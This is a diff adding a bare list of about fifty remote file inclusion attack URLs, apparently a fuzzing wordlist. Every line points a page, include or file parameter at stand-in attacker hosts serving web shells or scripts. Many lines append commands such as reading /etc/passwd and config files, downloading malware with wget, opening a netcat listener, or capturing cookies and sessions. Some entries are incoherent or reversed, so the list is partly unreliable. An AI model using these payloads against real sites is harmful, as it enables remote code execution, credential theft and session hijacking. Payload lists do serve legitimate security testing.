@@ -1,0 +1,50 @@
+http://example.com/malicious_file.txt
+http://attacker.com/shell.php
+https://evil.com/webshell.txt
+//malicious-site.com/script.php
+//attacker-site.com/evilcode.php?cmd=ls
+https://external.com/?page=http://malicious.com/script.php
+http://vulnerable.com/index.php?page=http://attacker.com/script.txt
+//evil-source.com/payload.php?command=whoami
+https://hacker.com/php-reverse-shell.php
+http://malicious-source.com/.htpasswd
+https://attack.com/cmd.php?cmd=id
+//example.com/remote.txt?http://malicious.com/cmd.txt
+http://vulnerable-site.com/?include=http://evil.com/shell.txt
+https://evilhost.com/nc.php?ip=192.168.1.1&port=4444
+//maliciousdomain.com/payload.php?user=root
+http://attack-site.com/?page=http://malicious.com/script.php&cmd=uname
+https://example.com/include.php?file=http://evil.com/webshell.txt
+//attacker.com/upload.php?file_url=http://malicious.com/shell.php
+http://injection-site.com/load.php?src=http://evil.com/hack.txt
+https://malicious.com/?load=http://attack.com/payload.php&cmd=ps
+//victim.com/index.php?path=http://attacker-site.com/code.php
+http://compromised.com/?file=http://malicious-site.com/script.php&arg=ls
+https://evil-site.com/get.php?file=http://attacker.com/.bash_history
+//example.com/page.php?include=http://evil.com/log.php&data=user
+http://vulnerable.com/load.php?source=http://malicious-site.com/shell.php&command=netstat
+https://attack.com/index.php?path=http://evil.com/cmd.php&cmd=pwd
+//victim-site.com/?page=http://malicious.com/phpinfo.php
+http://example.com/?action=http://attacker-site.com/script.php&cmd=cat /etc/passwd
+https://compromised-site.com/module.php?file=http://malicious.com/exploit.txt
+//vulnerable-site.com/inc.php?file=http://evil.com/database.php
+http://attack.com/?load=http://malicious-site.com/backdoor.php
+https://example.com/?include=http://attacker.com/config.php
+//victim.com/page.php?src=http://malicious-site.com/cmd.php&command=ifconfig
+http://evil.com/?page=http://attack-site.com/script.php&cmd=ls -la
+https://vulnerable.com/include.php?path=http://malicious.com/credentials.php
+//attacker-site.com/load.php?file=http://evil.com/passwords.txt
+http://malicious.com/?action=http://victim-site.com/webshell.php?cmd=id
+https://attack.com/page.php?source=http://evil.com/script.php&command=uname -a
+//compromised.com/?path=http://malicious-site.com/shell.php&cmd=wget http://attacker.com/malware
+http://example.com/?file=http://evil.com/login.php
+https://victim-site.com/?include=http://malicious.com/code.php&cmd=who
+//attack-site.com/?load=http://evil.com/database.php?info=users
+http://vulnerable.com/?page=http://attacker.com/steal.php?cookie=
+https://malicious-site.com/?file=http://victim.com/cmd.php?command=nc -lvp 4444
+//evil.com/page.php?include=http://attack-site.com/hack.php&cmd=cat /var/www/html/config.php
+http://compromised-site.com/load.php?src=http://malicious.com/drive.php
+https://victim.com/?path=http://attacker-site.com/echo.php?text=hello
+//example.com/?file=http://evil-site.com/fetch.php?ip=127.0.0.1
+http://attack.com/page.php?source=http://malicious-site.com/execute.php&command=ping -c 4 google.com
+https://vulnerable-site.com/include.php?file=http://attacker.com/capture.php?data=session
